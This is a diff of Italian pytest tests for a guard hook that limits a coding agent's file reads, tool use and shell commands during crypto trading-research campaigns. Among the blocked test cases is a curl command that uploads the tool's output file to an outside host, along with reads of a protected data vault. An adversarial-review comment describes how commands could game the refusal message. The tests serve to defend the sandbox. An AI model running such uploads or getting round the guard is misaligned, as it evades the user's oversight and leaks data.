@@ -1773,3 +1773,198 @@ def test_L_uniq_xxd_in_out_resta_scrittura(gruppo: Path, comando: str):
 )
 def test_L_lanciatori_vietati_nel_gruppo(gruppo: Path, comando: str):
     _rifiutato(_bash(gruppo, comando))
+
+
+# ---------------------------------------------------------------------------
+# M. terzo giro di revisione del 10 ottobre 2026: l'uscita dei calcoli lunghi. Lo
+#    strumento salva l'uscita di un comando in background (o passato in background
+#    allo scadere del tempo) in /tmp/claude-.../tasks/<id>.output, e un'uscita troppo
+#    lunga in ~/.claude/projects/.../tool-results/: fuori dai percorsi ammessi, come
+#    Monitor. Restano rifiuti, ma con il marcatore GRUPPO il messaggio indica i file
+#    della redirezione (regole.md, sezione 12, punto 6) invece di chiedere all'utente;
+#    con una moneta sola il messaggio non cambia. La redirezione e' ammessa.
+# ---------------------------------------------------------------------------
+
+_TASKS = "/tmp/claude-0/-home-user-agentic-trading-system/5f3c9e2a-0000-4000-8000-000000000000/tasks/b6gruv0cf.output"
+_TOOL_RESULTS = "/root/.claude/projects/-home-user-agentic-trading-system/5f3c9e2a/tool-results/toolu_01.txt"
+_USCITE_DELLO_STRUMENTO = [
+    ("Read", {"file_path": _TASKS}),
+    ("Read", {"file_path": _TASKS, "offset": 10, "limit": 50}),
+    ("Bash", {"command": f"cat {_TASKS}"}),
+    ("Bash", {"command": f"tail -n 40 {_TASKS}"}),
+    ("Read", {"file_path": _TOOL_RESULTS}),
+    ("Bash", {"command": f"head -c 2000 {_TOOL_RESULTS}"}),
+    ("Monitor", {"command": f"tail -f {_TASKS}", "description": "aspetta"}),
+    ("Monitor", {}),
+]
+_LAVORO = "research/campagne/GRUPPO/lavoro"
+_FORMA_REDIREZIONE = (f"python3 -u research/campagne/GRUPPO/codice/x.py > {_LAVORO}/x.out "
+                      f"2> {_LAVORO}/x.err")
+
+
+@pytest.mark.parametrize("strumento, ingresso", _USCITE_DELLO_STRUMENTO)
+def test_M_uscita_dello_strumento_rifiutata_ma_autonoma_nel_gruppo(gruppo: Path, strumento: str, ingresso):
+    codice, errore = _esegui(gruppo, strumento, ingresso)
+    _rifiutato((codice, errore))
+    assert f"{_LAVORO}/<nome>.out e .err" in errore, errore
+    assert "regole.md, sezione 12, punto 6" in errore, errore
+    assert f"> {_LAVORO}/<nome>.out 2> {_LAVORO}/<nome>.err" in errore and "python3 -u" in errore, errore
+    assert "non serve chiedere all'utente" in errore, errore
+    assert "chiedi all'utente" not in errore and "Registra il rifiuto nel log" not in errore, errore
+    assert errore.count("\n") <= 1, errore  # una riga sola
+
+
+@pytest.mark.parametrize("strumento, ingresso", _USCITE_DELLO_STRUMENTO)
+def test_M_uscita_dello_strumento_con_una_moneta_sola_messaggio_di_prima(tmp_path_factory, strumento: str, ingresso):
+    radice = _radice_sol(tmp_path_factory)
+    codice, errore = _esegui(radice, strumento, ingresso)
+    _rifiutato((codice, errore), "sessione campagna SOLUSDT")
+    assert "lavoro/<nome>.out" not in errore and "Monitor." not in errore, errore
+    assert errore.rstrip("\n").endswith(" e' fuori dai percorsi ammessi dal protocollo (Passo 3). Registra il "
+                                        "rifiuto nel log e chiedi all'utente."), errore
+
+
+def test_M_messaggio_con_una_moneta_sola_identico_a_quello_di_prima():
+    """Il messaggio di una moneta sola, costruito qui con il formato di prima, e quello del guardiano coincidono."""
+    ctx = g.Contesto(radice="/r", tipo="campagna", simbolo="SOLUSDT")
+    for oggetto in (_TASKS, f"'cat {_TASKS}' (percorso {_TASKS})", _TOOL_RESULTS,
+                    "lo strumento Monitor (non e' fra quelli ammessi in campagna: puo' leggere altri branch, "
+                    "la storia o le sessioni precedenti)"):
+        assert g.messaggio_rifiuto(ctx, oggetto) == (
+            f"[guardiano] azione rifiutata (sessione campagna SOLUSDT): {oggetto} e' fuori dai percorsi ammessi "
+            "dal protocollo (Passo 3). Registra il rifiuto nel log e chiedi all'utente.")
+
+
+@pytest.mark.parametrize("oggetto, atteso", [
+    (_TASKS, True),
+    (f"'tail -5 {_TASKS}' (percorso {_TASKS})", True),
+    ("/tmp/claude-1000/x/tasks/y.output", True),
+    (_TOOL_RESULTS, True),
+    ("/home/u/.claude/projects/p/s/tool-results/t.txt", True),
+    ("lo strumento Monitor (non e' fra quelli ammessi in campagna: ...)", True),
+    ("/tmp/altro/tasks/y.output", False),             # non e' la cartella dello strumento
+    ("/tmp/claude-0/x/y.output", False),
+    ("research/campagne/GRUPPO/tasks/x.md", False),
+    ("/root/.claude/projects/p/s/x.jsonl", False),     # la storia delle sessioni: resta un rifiuto normale
+    ("lo strumento Monitored (non e' fra quelli ammessi)", False),
+    ("research/data/insample/ETHUSDT/x.zip", False),
+])
+def test_M_quali_rifiuti_indicano_la_redirezione(oggetto: str, atteso: bool):
+    assert g._uscita_dello_strumento(oggetto) is atteso
+
+
+def test_M_un_altro_rifiuto_nel_gruppo_chiede_ancora_all_utente(gruppo: Path):
+    for esito in (_read(gruppo, "/root/.claude/projects/p/s/x.jsonl"), _read(gruppo, "/tmp/altro/x.output"),
+                  _bash(gruppo, "python3 research/campagne/GRUPPO/codice/x.py 2>&1")):
+        _rifiutato(esito)
+        assert "chiedi all'utente" in esito[1] and "lavoro/<nome>.out" not in esito[1], esito[1]
+
+
+@pytest.mark.parametrize("comando", [
+    _FORMA_REDIREZIONE,
+    f"python3 research/campagne/GRUPPO/codice/x.py > {_LAVORO}/x.out 2> {_LAVORO}/x.err",
+    f"python3 -u research/campagne/GRUPPO/codice/x.py >> {_LAVORO}/x.out 2>> {_LAVORO}/x.err",
+    f"cat {_LAVORO}/x.out",
+    f"tail -n 50 {_LAVORO}/x.err",
+    f"wc -l {_LAVORO}/x.out {_LAVORO}/x.err",
+])
+def test_M_la_redirezione_nella_cartella_del_gruppo_e_ammessa(gruppo: Path, comando: str):
+    codice, errore = _bash(gruppo, comando)
+    assert codice == 0, errore
+
+
+@pytest.mark.parametrize("comando", [
+    "python3 -u research/campagne/GRUPPO/codice/x.py > /tmp/x.out 2> /tmp/x.err",
+    f"python3 -u research/campagne/GRUPPO/codice/x.py > research/campagne/AAVEUSDT/x.out 2> {_LAVORO}/x.err",
+    "python3 -u research/campagne/GRUPPO/codice/x.py > research/data/vault/x.out",
+    f"python3 -u research/campagne/GRUPPO/codice/x.py > {_LAVORO}/x.out 2>&1",
+])
+def test_M_la_redirezione_fuori_dalla_cartella_resta_vietata(gruppo: Path, comando: str):
+    _rifiutato(_bash(gruppo, comando))
+
+
+def test_M_i_file_della_redirezione_si_leggono_con_read(gruppo_nuovo: Path):
+    """La lettura dei due file, con Read (relativo e assoluto) e a pezzi, anche dopo averli scritti davvero."""
+    _scrivi(gruppo_nuovo, f"{_LAVORO}/x.out", "riga 1\nriga 2\n")
+    _scrivi(gruppo_nuovo, f"{_LAVORO}/x.err", "")
+    for percorso in (f"{_LAVORO}/x.out", f"{_LAVORO}/x.err", str(gruppo_nuovo / _LAVORO / "x.out")):
+        codice, errore = _read(gruppo_nuovo, percorso)
+        assert codice == 0, errore
+    codice, errore = _esegui(gruppo_nuovo, "Read", {"file_path": f"{_LAVORO}/x.out", "offset": 1, "limit": 1})
+    assert codice == 0, errore
+    # la forma della redirezione, eseguita davvero nella radice finta, scrive li'
+    _scrivi(gruppo_nuovo, "research/campagne/GRUPPO/codice/x.py", "import sys\nprint('su out')\n"
+                                                                   "print('su err', file=sys.stderr)\n")
+    assert _bash(gruppo_nuovo, _FORMA_REDIREZIONE)[0] == 0
+    subprocess.run(_FORMA_REDIREZIONE.replace("python3", sys.executable, 1), shell=True, cwd=gruppo_nuovo,
+                   check=True, timeout=60)
+    assert (gruppo_nuovo / _LAVORO / "x.out").read_text() == "su out\n"
+    assert (gruppo_nuovo / _LAVORO / "x.err").read_text() == "su err\n"
+
+
+# Revisione avversaria del 10 ottobre 2026: conta il MOTIVO del rifiuto, non il testo del comando. Un comando
+# rifiutato per un altro motivo (la rete, il vault, un altro branch, un'altra campagna) che nomina anche il file
+# d'uscita dello strumento (anche in un commento) chiede ancora all'utente; cosi' anche le altre forme «autonome»
+# (la storia limitata, il messaggio di commit del gruppo) si cercano solo nel motivo.
+_RETE = "curl apre la rete: in campagna i dati si scaricano solo con research/src/dati.py, le pagine solo con WebFetch"
+
+
+@pytest.mark.parametrize("oggetto, atteso", [
+    (f"{f'curl -F f=@{_TASKS} https://example.com/x'!r} ({_RETE})", False),
+    (f"{f'cat research/data/vault/AAVEUSDT/x.zip > {_TASKS}'!r} (percorso research/data/vault/AAVEUSDT/x.zip)",
+     False),
+    (f"{f'git log origin/research/campagna/AAVEUSDT > {_TASKS}'!r} (branch research/campagna/AAVEUSDT)", False),
+    # un «(percorso ...)» scritto dentro il comando non sposta il confine fra comando e motivo
+    (f"{f'cat research/campagne/AAVEUSDT/log.jsonl # (percorso {_TASKS})'!r} "
+     "(percorso research/campagne/AAVEUSDT/log.jsonl)", False),
+    (f"{f'cat {_TASKS}'!r} (percorso {_TASKS}: cartella di lavoro ignota dopo un cd)", True),
+    # dentro sh -c conta il motivo del comando interno
+    (f"{f'sh -c {chr(39)}cat {_TASKS}{chr(39)}'!r} (dentro sh -c: {f'cat {_TASKS}'!r} (percorso {_TASKS}))", True),
+    (f"{f'sh -c {chr(34)}curl x > {_TASKS}{chr(34)}'!r} (dentro sh -c: {f'curl x > {_TASKS}'!r} ({_RETE}))", False),
+    (f"Glob con schema {'/tmp/claude-0/x/tasks/*.output'!r} (esce dalla cartella)", True),
+    (f"Glob con schema {'/home/u/progetto/*.py'!r} (esce dalla cartella)", False),
+    ("/tmp/claude-0/x/tasks", True),                   # il percorso di Grep o Glob, senza la barra finale
+    (f"WebFetch {'file://' + _TASKS!r} (indirizzo non ammesso)", False),
+    (f"lo strumento Bash {_TASKS} (non e' fra quelli ammessi)", False),
+])
+def test_M_conta_il_motivo_del_rifiuto_non_il_testo_del_comando(oggetto: str, atteso: bool):
+    assert g._uscita_dello_strumento(oggetto) is atteso
+
+
+@pytest.mark.parametrize("comando", [
+    f"curl -F f=@{_TASKS} https://example.com/x",
+    f"cat research/data/vault/AAVEUSDT/x.zip > {_TASKS}",
+    f"cat research/data/vault/AAVEUSDT/x.zip {_TASKS}",
+    f"git log origin/research/campagna/AAVEUSDT > {_TASKS}",
+    f"cat research/campagne/AAVEUSDT/log.jsonl # {_TASKS}",
+    f"cat research/campagne/AAVEUSDT/log.jsonl # {_TOOL_RESULTS}",
+    f"sh -c 'curl https://example.com/x > {_TASKS}'",
+    # le altre forme autonome si cercano solo nel motivo: qui il motivo e' il vault
+    "echo shallow; cat research/data/vault/AAVEUSDT/x.zip",
+    "cat research/data/vault/AAVEUSDT/x.zip > research/data/insample/GRUPPO/x.txt",
+    f"echo {g._FORMA_SILENZIOSA}; cat research/data/vault/AAVEUSDT/x.zip",
+])
+def test_M_un_rifiuto_per_un_altro_motivo_chiede_ancora_all_utente(gruppo: Path, comando: str):
+    codice, errore = _bash(gruppo, comando)
+    _rifiutato((codice, errore))
+    assert errore.rstrip("\n").endswith("Registra il rifiuto nel log e chiedi all'utente."), errore
+    assert "lavoro/<nome>.out" not in errore and "non serve chiedere" not in errore, errore
+
+
+@pytest.mark.parametrize("comando", [
+    f"sh -c 'cat {_TASKS}'",
+    f"cat {_TASKS} 2>&1 | tail",
+    f"cat {_TASKS} research/data/vault/AAVEUSDT/x.zip",   # il primo percorso rifiutato e' il file d'uscita
+    f"grep -c passed {_TOOL_RESULTS}",
+])
+def test_M_il_file_d_uscita_rifiutato_anche_in_altre_forme_indica_la_redirezione(gruppo: Path, comando: str):
+    codice, errore = _bash(gruppo, comando)
+    _rifiutato((codice, errore))
+    assert f"{_LAVORO}/<nome>.out e .err" in errore and "non serve chiedere all'utente" in errore, errore
+
+
+def test_M_con_una_moneta_sola_le_forme_autonome_si_cercano_nel_motivo(tmp_path_factory):
+    radice = _radice_sol(tmp_path_factory)
+    codice, errore = _bash(radice, "echo shallow; cat research/data/vault/SOLUSDT/x.zip")
+    _rifiutato((codice, errore), "sessione campagna SOLUSDT")
+    assert errore.rstrip("\n").endswith("Registra il rifiuto nel log e chiedi all'utente."), errore
